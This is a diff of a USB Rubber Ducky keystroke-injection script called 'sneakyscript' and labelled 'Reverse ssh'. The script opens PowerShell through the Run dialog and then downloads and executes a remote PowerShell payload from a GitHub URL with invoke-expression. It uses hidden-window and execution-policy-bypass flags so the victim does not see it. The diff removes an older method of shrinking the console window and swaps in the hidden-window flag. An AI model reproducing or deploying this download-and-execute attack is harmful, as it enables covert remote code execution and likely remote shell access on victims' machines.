@@ -1,41 +1,19 @@
 REM Author: sadwhite
 REM Name: sneakyscript
-REM Using the run cmmand 
+REM Reverse ssh  
 
 REM *** Initial Delay *** 
 DELAY 2000
 
-REM *** Open powershell ***
+REM *** Open Run ***
 GUI r
 DELAY 250
 STRING powershell
 ENTER
 DELAY 400
 
-REM *** Hide PowerShell ***
-STRING [console]::WindowHeight=10
-ENTER
-STRING [console]::WindowWidth=10
-ENTER
-ALT SPACE
-STRING m
-LEFTARROW
-REPEAT 30
-STRING [console]::WindowHeight=5
-ENTER
-STRING [console]::WindowWidth=5
-ENTER
-ALT SPACE
-STRING m
-LEFTARROW
-REPEAT 10
-STRING [console]::WindowHeight=1
-ENTER
-STRING [console]::WindowWidth=1
-ENTER
-
 REM *** Download and execute the payload ***
 
-STRING $pl = iwr https://raw.githubusercontent.com/Dev-Sadwhite/Rubber-Test/main/payloads-download/windows/1.ps1?dl=1; invoke-expression $pl 
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/Dev-Sadwhite/Rubber-Test/main/payloads-download/windows/1.ps1?dl=1; invoke-expression $pl 
 ENTER
 DELAY 100
